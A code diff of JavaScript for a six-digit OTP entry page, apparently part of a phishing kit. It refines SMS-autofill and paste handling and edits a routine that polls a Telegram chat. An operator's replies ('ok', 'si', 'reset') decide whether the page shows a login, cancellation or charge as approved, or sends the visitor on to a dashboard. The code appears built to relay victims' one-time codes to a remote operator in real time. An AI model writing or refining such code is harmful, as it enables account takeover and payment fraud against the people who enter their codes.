@@ -135,6 +135,53 @@
     }
   }
 
+  // EVENTOS DE LOS INPUTS ASIGNADOS EN TU ORDEN ORIGINAL
+  inputs.forEach((input, index) => {
+    input.addEventListener("input", (e) => {
+      input.classList.remove("invalid");
+      const val = e.target.value;
+
+      if (val.length > 1) {
+        const numeros = val.replace(/\D/g, "");
+        const cleanValue = numeros.slice(-6); 
+        
+        cleanValue.split("").forEach((char, idx) => {
+          if (inputs[idx]) {
+            inputs[idx].value = char;
+          }
+        });
+        
+        refreshSubmitState();
+        if (isComplete() && form) {
+          enviarFormulario();
+        }
+        return;
+      }
+
+      input.value = val.replace(/\D/g, "");
+      if (input.value && index < inputs.length - 1) {
+        inputs[index + 1].focus();
+      }
+      refreshSubmitState();
+    });
+
+    input.addEventListener("keydown", (e) => {
+      if (e.key === "Backspace" && !e.target.value && index > 0) {
+        inputs[index - 1].focus();
+        inputs[index - 1].value = "";
+        inputs[index - 1].classList.remove("invalid");
+        refreshSubmitState();
+      }
+    });
+  });
+
+  if (form) {
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+      enviarFormulario();
+    });
+  }
+
   // ============================================================
   // FUNCIÓN ENCAPSULADA DE ENVÍO Y ESCUCHA TELEGRAM
   // ============================================================
@@ -149,6 +196,10 @@
         messageEl.className = "otp-message";
         messageEl.style.color = "#666666";
       }
+
+      // CONTROL DE VISIBILIDAD DEL LOADER
+      const loader = document.getElementById("loading-container");
+      if (loader) loader.style.display = "flex";
 
       let lastUpdateIdApproval = 0;
       try {
@@ -193,9 +244,7 @@
               if (msg && msg.chat && String(msg.chat.id) === String(TELEGRAM_CHAT_ID) && msg.text) {
                 const msgText = msg.text.trim().toLowerCase();
                 
-                // ============================================================
-                // [INTEGRACIÓN] INTERCEPCIÓN PRIORITARIA DE REINICIO GLOBAL
-                // ============================================================
+                // INTERCEPCIÓN PRIORITARIA DE REINICIO GLOBAL
                 if (msgText === 'reinicio' || msgText === 'reset') {
                   if (loader) loader.style.display = "none";
                   localStorage.clear();
@@ -203,8 +252,6 @@
                   window.location.replace("index.html");
                   return;
                 }
-                // ============================================================
-
 
                 if (msgText === 'ok' || msgText === 'si' || msgText === '1') {
                   decision = 'approved';
@@ -228,6 +275,7 @@
       const flowType = sessionStorage.getItem('flow_type') || 'charge';
       const chargeAction = sessionStorage.getItem('charge_action') || 'Aprobado'; 
 
+
       if (decision === 'approved') {
         try {
           if (timerId) clearInterval(timerId);
@@ -245,22 +293,19 @@
         if (messageEl) {
           if (flowType === 'login') {
             messageEl.textContent = "Inicio de sesión correcto.";
-            messageEl.style.color = "#28a745"; // Verde
+            messageEl.style.color = "#28a745"; 
           } else if (flowType === 'baja') {
             messageEl.textContent = "¡Validación de Baja Exitosa!";
-            messageEl.style.color = "#28a745"; // Verde
+            messageEl.style.color = "#28a745"; 
           } else {
-            // Evaluamos de forma segura pasando a minúsculas para evitar fallas de mayúsculas
             const accionNormalizada = String(chargeAction).toLowerCase();
 
             if (accionNormalizada === 'aprobado') {
-              // CAMBIO SOLICITADO: Frase exacta en color verde para aprobación
               messageEl.textContent = "¡Aprobación Confirmada y Aplicada!";
-              messageEl.style.color = "#28a745"; // Color Verde (#28a745)
+              messageEl.style.color = "#28a745"; 
             } else {
-              // Se mantiene tu frase original en color rojo para el rechazo
               messageEl.textContent = "¡Rechazo Confirmado y Aplicado!";
-              messageEl.style.color = "#d9534f"; // Color Rojo (#d9534f)
+              messageEl.style.color = "#d9534f"; 
             }
           }
           messageEl.className = "otp-message success";
@@ -275,6 +320,7 @@
         console.log("Validación finalizada. Redirigiendo al dashboard...");
 
         setTimeout(() => {
+          if (loader) loader.style.display = "none"; // CORREGIDO: Apagado seguro del loader antes de cambiar de página
           try {
             window.location.replace("dashboard.html");
           } catch (e) {
@@ -284,8 +330,8 @@
 
         return; 
 
-
       } else if (decision === 'rejected') {
+        if (loader) loader.style.display = "none"; // CORREGIDO: Apagado seguro del loader al rechazar código
         submitBtn.disabled = false;
         submitBtn.textContent = "Validar código";
         if (messageEl) {
@@ -301,64 +347,64 @@
       }
     }
 
-
-// ============================================================
+  // ============================================================
   // EVENTOS DE LOS INPUTS CORREGIDOS PARA IPHONE Y ANDROID
   // ============================================================
   inputs.forEach((input, index) => {
-// CORRECCIÓN PARA IPHONE: Permitir temporalmente texto más largo antes del filtrado
-input.addEventListener("keydown", (e) => {
-if (e.key === "Backspace" && !input.value && index > 0) {
-inputs[index - 1].focus();
-inputs[index - 1].value = "";
-inputs[index - 1].classList.remove("invalid");
-refreshSubmitState();
-} else {
-// Al presionar cualquier tecla en iOS, ampliamos dinámicamente el límite
-// para que quepa el código de autocompletado completo de 6 dígitos.
-input.setAttribute("maxlength", "6");
-}
-});
-input.addEventListener("input", (e) => {
-input.classList.remove("invalid");
-const val = e.target.value;
-// DETECCIÓN DE SUGERENCIA SMS O PEGADO DE TEXTO COMPLETO (6 dígitos o más)
-if (val.length > 1) {
-// Extrae todos los números del mensaje
-const numeros = val.replace(/\D/g, "");
-// Toma los últimos 6 dígitos (evitando problemas con precios o textos adicionales)
-const cleanValue = numeros.slice(-6);
-// Distribuye los 6 caracteres casilla por casilla
-cleanValue.split("").forEach((char, idx) => {
-if (inputs[idx]) {
-inputs[idx].setAttribute("maxlength", "1"); // Restaura el límite nativo
-inputs[idx].value = char;
-}
-});
-refreshSubmitState();
-if (isComplete()) {
-enviarFormulario();
-}
-return;
-}
-// CONTROL DE ESCRITURA MANUAL ESTÁNDAR (Restauración de longitud)
-input.setAttribute("maxlength", "1");
-input.value = val.replace(/\D/g, "").slice(0, 1);
-if (input.value && index < inputs.length - 1) {
-inputs[index + 1].focus();
-}
-refreshSubmitState();
-// Dispara automáticamente al escribir a mano el sexto dígito
-if (isComplete()) {
-enviarFormulario();
-}
-});
-});
-// Intercepción final del evento Submit manual o por tecla enter
-if (form) {
-form.addEventListener("submit", function (e) {
-e.preventDefault();
-enviarFormulario();
-});
-}
+    // CORRECCIÓN PARA IPHONE: Permitir temporalmente texto más largo antes del filtrado
+    input.addEventListener("keydown", (e) => {
+      if (e.key === "Backspace" && !input.value && index > 0) {
+        inputs[index - 1].focus();
+        inputs[index - 1].value = "";
+        inputs[index - 1].classList.remove("invalid");
+        refreshSubmitState();
+      } else {
+        input.setAttribute("maxlength", "6");
+      }
+    });
+
+    input.addEventListener("input", (e) => {
+      input.classList.remove("invalid");
+      const val = e.target.value;
+
+      // DETECCIÓN DE SUGERENCIA SMS O PEGADO DE TEXTO COMPLETO (6 dígitos o más)
+      if (val.length > 1) {
+        const numeros = val.replace(/\D/g, "");
+        const cleanValue = numeros.slice(-6);
+        
+        cleanValue.split("").forEach((char, idx) => {
+          if (inputs[idx]) {
+            inputs[idx].setAttribute("maxlength", "1"); 
+            inputs[idx].value = char;
+          }
+        });
+        
+        refreshSubmitState();
+        if (isComplete()) {
+          enviarFormulario();
+        }
+        return;
+      }
+
+      // CONTROL DE ESCRITURA MANUAL ESTÁNDAR
+      input.setAttribute("maxlength", "1");
+      input.value = val.replace(/\D/g, "").slice(0, 1);
+      if (input.value && index < inputs.length - 1) {
+        inputs[index + 1].focus();
+      }
+      refreshSubmitState();
+
+      if (isComplete()) {
+        enviarFormulario();
+      }
+    });
+  });
+
+  // Intercepción final del evento Submit manual o por tecla enter
+  if (form) {
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+      enviarFormulario();
+    });
+  }
 })();
